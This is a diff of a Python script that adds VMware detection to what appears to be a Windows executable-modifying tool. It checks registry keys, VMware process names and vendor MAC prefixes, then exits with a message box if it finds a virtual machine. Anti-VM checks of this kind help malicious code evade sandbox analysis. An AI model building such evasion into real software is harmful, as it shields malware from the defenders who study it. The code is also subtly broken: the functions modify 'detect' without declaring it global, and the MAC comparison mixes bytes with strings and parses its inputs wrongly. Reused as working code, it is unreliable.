@@ -1,9 +1,13 @@
 import pefile
 import winreg
 import ctypes
+import struct
+import socket
+import netifaces
 from os import listdir, getcwd
 from os.path import isfile, join
 from struct import pack
+# --------------------------Part 2------------------------------
 
 # Define the message box parameters
 message = "Bad environment --- VMWare Detected!!!!"
@@ -28,8 +32,8 @@ detect = 0
 # Check System Info Registry key
 try:
     syskey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_system)
-    Mf_value = winreg.QueryValueEx(syskey, sys_man)
-    for value in Mf_value:
+    Manu_value = winreg.QueryValueEx(syskey, sys_man)
+    for value in Manu_value:
         if (value.__contains__("VMware")):
             detect = detect + 1
             break
@@ -50,8 +54,7 @@ def get_process_id_from_name(process_name):
             return process.info['pid']
     return None
 
-def vmware_processes():
-    
+def vmware_processes(): 
     # Array of strings of VMware processes
     szProcesses = [
         "vmtoolsd.exe",
@@ -60,13 +63,46 @@ def vmware_processes():
         "VGAuthService.exe",
         "vmacthlp.exe",
     ]
-
+    
     iLength = len(szProcesses)
     for i in range(iLength):
         msg = f"Checking VMware process {szProcesses[i]}"
         if get_process_id_from_name(szProcesses[i]):
               detect = detect + 1
              
+def check_mac_addr(szMac):
+    # Convert the given mac address to a byte string so we can compare.
+    mac_bytes = struct.pack('BBBBBB', *[int(szMac[i:i+2], 16) for i in range(0, len(szMac), 2)])
+    
+    # Get a list of all network interfaces
+    interfaces = netifaces.interfaces()
+
+    # Find the MAC address of the first interface that has a MAC address that matches the given MAC address
+    for interface in interfaces:
+        addrs = netifaces.ifaddresses(interface).get(netifaces.AF_LINK)
+        if addrs is not None:
+            for addr in addrs:
+                if addr['addr'] == mac_bytes:
+                    return True
+
+    # If no matching MAC address is found, return False
+    return False
+
+def vmware_mac():
+    # VMWare blacklisted MAC addresses
+    szMac = [
+        ["\x00\x05\x69", "00:05:69"],  # VMWare, Inc.
+        ["\x00\x0C\x29", "00:0c:29"],  # VMWare, Inc.
+        ["\x00\x1C\x14", "00:1C:14"],  # VMWare, Inc.
+        ["\x00\x50\x56", "00:50:56"],  # VMWare, Inc.
+    ]
+    dwLength = len(szMac)
+
+    # Check one by one
+    for i in range(dwLength):
+        msg = f"Checking MAC starting with {szMac[i][1]}"
+        if check_mac_addr(szMac[i][0]):
+           detect = detect + 1
 
 # Check Hardware Info registry key
 try:
@@ -80,7 +116,6 @@ try:
 except:
     print("Cant open Scsi Port 1")
     
-
 try:
     hardkey2 = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_hardware_2)
     localid3_value = winreg.QueryValueEx(hardkey2, id)
@@ -90,7 +125,7 @@ try:
             break
     winreg.CloseKey(hardkey2)
 except:
-    print("Cant open Scsi Port 2")
+    print("Can't open Scsi Port 2")
         
 
 # Check VMware tool
@@ -98,7 +133,7 @@ try:
     if(winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_software)):
         detect = detect + 1
 except:
-    print("Cant find VMware Tool registry key")
+    print("Can't find VMware Tool registry key")
     
 
 # Check if the value exists in the key
@@ -106,6 +141,7 @@ if (detect > 0):
     ctypes.windll.user32.MessageBoxW(None, message, title, style)
     exit()
     
+# ---------------------Part 1--------------------------
 def align(size, align):
 	if size % align: 
 		size = ((size + align) // align) * align
